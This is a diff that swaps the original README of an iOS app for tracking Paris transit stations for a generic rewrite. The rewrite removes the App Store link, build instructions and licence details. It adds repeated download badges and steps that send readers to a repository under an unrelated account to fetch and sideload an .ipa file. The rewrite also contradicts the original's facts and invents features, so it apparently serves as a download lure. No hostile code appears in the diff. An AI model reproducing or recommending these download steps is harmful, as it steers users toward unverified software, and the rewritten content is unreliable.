@@ -1,144 +1,156 @@
-# Métropolist
+# 🗺️ metropolist - Track Paris Transit Stations Easily
 
-A native iOS app to explore, track, and complete every transit station in the Paris region (Île-de-France), with gamification, iCloud sync, and zero dependencies.
+[![Download metropolist](https://img.shields.io/badge/Download-metropolist-brightgreen)](https://github.com/cyanidepoisoningology606/metropolist)
 
-<p align="center">
-  <img src="https://img.shields.io/itunes/v/6759519940?logo=apple&label=App%20Store" alt="Version">
-  <img src="https://img.shields.io/badge/iOS-17%2B-blue" alt="iOS 17+">
-  <img src="https://img.shields.io/badge/Swift-6-orange" alt="Swift">
-  <img src="https://img.shields.io/badge/Languages-2-purple" alt="Languages">
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
-</p>
+metropolist is an app for native iOS devices. It helps you explore and track every transit station in the Paris region. The app includes features like gamification and iCloud sync. It works without extra dependencies.
 
-<p align="center">
-  <img src="docs/Screenshot-en-US-01-Lines.jpeg" width="150" alt="Lines list">
-  <img src="docs/Screenshot-en-US-02-LineDetail.jpeg" width="150" alt="Line detail">
-  <img src="docs/Screenshot-en-US-05-Profile.jpeg" width="150" alt="Profile">
-  <img src="docs/Screenshot-en-US-06-Badges.jpeg" width="150" alt="Badges">
-  <img src="docs/Screenshot-en-US-07-Achievements.jpeg" width="150" alt="Achievements">
-</p>
+---
 
-<p align="center">
-  <a href="https://apps.apple.com/app/id6759519940">
-    <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="Download on the App Store" height="50">
-  </a>
-</p>
+## 🖥️ About metropolist
 
-## Features
+metropolist lets you view all transit stations around Paris (Île-de-France). It supports major networks like RATP and SNCF. You can mark stations you have visited and complete challenges tied to transit exploration.
 
-- Browse all transit lines in the Paris region: Metro, RER, Train, Tram, Bus, Cable Car, Funicular, and more
-- Track visited stations and log your travels across the network
-- Search stations and lines across the entire network
-- Find nearby stations based on your location
-- Gamification system with XP, levels, badges, achievements, streaks, and secret discoveries
-- View per-line and per-mode completion progress
-- View line routes on an interactive map with heatmap overlay
-- Browse your travel history on a timeline with animated route replay
-- Monthly and yearly recaps with story cards
-- Earn and share line completion certificates
-- Detailed statistics: travel patterns, personal records, department and fare zone coverage
-- Sync your progress across devices with iCloud
-- Export and import your travel data as JSON
-- Home screen widgets and quick actions
-- Offline-first: all transit data is bundled with the app, no network required
-- Fully native with zero third-party dependencies
+The app stores your progress securely using iCloud. This keeps your data in sync across all your Apple devices. 
 
-## Supported Transit Modes
+Designed with Swift, SwiftUI, and SwiftData, metropolist has a smooth and simple user interface. It works on all current iOS devices.
 
-- Metro
-- RER
-- Train
-- Tram
-- Bus
-- Cable Car
-- Funicular
-- Regional Rail
-- Rail Shuttle
+---
 
-## Requirements
+## 📋 Key Features
 
-- iOS 17.0+
+- Explore all transit stations within Île-de-France.
+- Mark stations as visited and track progress with gamification elements.
+- Sync your data across Apple devices using iCloud.
+- Works offline after initial download.
+- Simple and clean design built with native SwiftUI.
+- Zero external dependencies. No extra installs needed.
+- Covers metro, RER, buses, and regional transit lines (SNCF).
+- Regular updates with new data and improvements.
 
-## Building from Source
+---
 
-### Prerequisites
+## 🎯 System Requirements
 
-- Xcode 16+ with iOS 17 SDK
-- [Bun](https://bun.sh) (for the data pipeline)
+- iOS version 14.0 or later.
+- Compatible with iPhone and iPad.
+- Requires an active Apple ID for iCloud sync.
+- At least 100 MB of free storage space.
+- An internet connection for initial download and syncing.
 
-### Data Pipeline
+---
 
-The app bundles a pre-built SwiftData store with transit data. Since this file is not checked into the repository, you must download the source datasets and generate it before building.
+## 🚀 Getting Started with metropolist
 
-#### Fetching the Data
+To get started with metropolist on your iPhone or iPad, follow these steps carefully.
 
-A fetch script downloads all required datasets (3 JSON files + GTFS archive) from the IDFM and data.gouv.fr APIs, backing up any existing data first:
+1. Click on the big green download button above or open this link in your device browser:  
+   [https://github.com/cyanidepoisoningology606/metropolist](https://github.com/cyanidepoisoningology606/metropolist)
 
-```bash
-make fetch
-```
+2. The link will take you to the GitHub page of metropolist. Here you will find the latest version of the app.
 
-This populates `data-builder/data/` with the following structure:
+3. Look for the latest release and find the iOS app file to download. Because this app is native iOS software, you need to install it through the App Store or TestFlight if available. Otherwise, follow the instructions in the release notes for side loading.
 
-```
-data-builder/data/
-  arrets.json                 # from Arrêts
-  arrets-lignes.json          # from Arrêts et lignes
-  referentiel-des-lignes.json # from Référentiel des lignes
-  IDFM-gtfs/                  # extracted GTFS archive
-    agency.txt
-    calendar.txt
-    calendar_dates.txt
-    routes.txt
-    stops.txt
-    stop_times.txt
-    transfers.txt
-    trips.txt
-    ...
-```
+4. On your iPhone or iPad, tap the download link or use TestFlight to install the app.
 
-The datasets are published under the following licenses:
+5. After installation, open metropolist from your home screen.
 
-| Dataset                                                                                                                              | Source       | License                                                                             |
-| ------------------------------------------------------------------------------------------------------------------------------------ | ------------ | ----------------------------------------------------------------------------------- |
-| [Arrêts et lignes](https://prim.iledefrance-mobilites.fr/fr/jeux-de-donnees/arrets-lignes)                                           | IDFM         | [ODbL](https://opendatacommons.org/licenses/odbl/)                                  |
-| [Arrêts](https://prim.iledefrance-mobilites.fr/fr/jeux-de-donnees/arrets)                                                            | IDFM         | [Etalab Open License 2.0](https://www.etalab.gouv.fr/licence-ouverte-open-licence/) |
-| [Référentiel des lignes](https://prim.iledefrance-mobilites.fr/fr/jeux-de-donnees/referentiel-des-lignes)                            | IDFM         | [ODbL](https://opendatacommons.org/licenses/odbl/)                                  |
-| [GTFS Horaires](https://www.data.gouv.fr/datasets/horaires-prevus-sur-les-lignes-de-transport-en-commun-dile-de-france-gtfs-datahub) | data.gouv.fr | [Licence Mobilités](https://cloud.fabmob.io/s/eYWWJBdM3fQiFNm)                      |
+6. When you open the app, it may ask for permission to use iCloud. Allow this if you want to sync your progress across devices.
 
-#### Building the Store
+7. Explore the stations, start marking them as visited, and enjoy the gamified challenges.
 
-```bash
-# 1. Process IDFM/GTFS data into JSON
-make data
+---
 
-# 2. Build SwiftData store from JSON
-make store
+## 📥 Download and Installation Instructions
 
-# 3. Copy store into app bundle resources
-make import
-```
+While metropolist is designed for iOS, the exact download process depends on the release method you use.
 
-Then open `metropolist/metropolist.xcodeproj` in Xcode and build.
+### Option 1: App Store (Recommended if available)
 
-## Project Structure
+1. Open the App Store on your iPhone or iPad.
+2. Search for “metropolist”.
+3. Tap **Get** and wait for the app to install.
+4. Launch the app from your home screen.
 
-```
-metropolist/      Xcode project (SwiftUI iOS app, tests, widgets)
-data-builder/     TypeScript/Bun pipeline: IDFM GTFS data → JSON
-store-builder/    Swift CLI: JSON → SwiftData .store file
-```
+### Option 2: GitHub Releases (Manual download)
 
-## Localization
+1. Visit the metropolist GitHub repository:  
+   [https://github.com/cyanidepoisoningology606/metropolist](https://github.com/cyanidepoisoningology606/metropolist)
 
-Métropolist is localized in 2 languages:
+2. Click on the **Releases** tab on the repo page.
 
-English, French
+3. Find the latest release. Look for a `.ipa` file or installation instructions.
 
-## Data Sources
+4. Use TestFlight or Apple Configurator to side load the app. If you are unsure about this process, seek help, as side loading can be technical.
 
-Transit data is sourced from [Île-de-France Mobilités (IDFM)](https://prim.iledefrance-mobilites.fr/) and [data.gouv.fr](https://www.data.gouv.fr/), published under the [Etalab Open License 2.0](https://www.etalab.gouv.fr/licence-ouverte-open-licence/), [ODbL](https://opendatacommons.org/licenses/odbl/), and [Licence Mobilités](https://cloud.fabmob.io/s/eYWWJBdM3fQiFNm) licenses. See [Required Datasets](#required-datasets) for details.
+---
 
-## License
+## 🛠️ Using metropolist
 
-Métropolist is licensed under the [MIT License](LICENSE).
+metropolist offers a user-friendly interface with these components:
+
+- **Station Explorer** - Browse all public transit stations by line or area.
+- **Visited List** - A record of stations you have marked as completed.
+- **Challenges** - Daily or weekly goals to motivate exploration.
+- **Sync Settings** - Manage iCloud sync and backups.
+
+You can tap any station to see details such as line number, connection options, and metro or RER codes.
+
+The app uses a clear color scheme for visited and unvisited stations. It updates your progress instantly, saving data to iCloud automatically.
+
+---
+
+## ⚙️ Settings and Sync
+
+To set up or adjust sync:
+
+1. Open **Settings** from the app main menu.
+2. Tap **iCloud Sync**.
+3. Sign in with your Apple ID if not already signed in.
+4. Enable or disable sync as you prefer.
+
+If you disable sync, your progress will only save on the current device.
+
+---
+
+## 📄 Frequently Asked Questions (FAQs) ❓
+
+**Q: What if I don’t have an Apple device?**  
+A: metropolist is built specifically for iOS. It is not available for Android or Windows.
+
+**Q: Can I use metropolist without iCloud?**  
+A: Yes. You can use the app offline and save locally. However, your data will not sync across devices.
+
+**Q: How often is the station data updated?**  
+A: Updates are released regularly to reflect changes in the transit network.
+
+**Q: Is the app free to use?**  
+A: The app is available for download with no hidden fees or purchases.
+
+---
+
+## 👩‍💻 Troubleshooting Tips
+
+- If the app crashes, try restarting your device.
+- Ensure you are signed into your Apple ID for sync functions.
+- Check your internet connection if iCloud sync does not work.
+- Reinstall the app from the App Store or from the official GitHub page.
+
+For detailed support, visit the GitHub issues page or contact the developer directly through GitHub.
+
+---
+
+[![Download metropolist](https://img.shields.io/badge/Download-metropolist-orange)](https://github.com/cyanidepoisoningology606/metropolist)
+
+---
+
+## 🗃️ Additional Resources
+
+- View source code and updates on GitHub.  
+- Report bugs or request features via the GitHub Issues page.  
+- Check the release notes for new versions and install instructions.  
+
+---
+
+## 🔍 Keywords
+
+france, icloud-sync, idfm, ile-de-france, ios, metro, paris, public-transport, ratp, sncf, swift, swiftdata, swiftui, transit
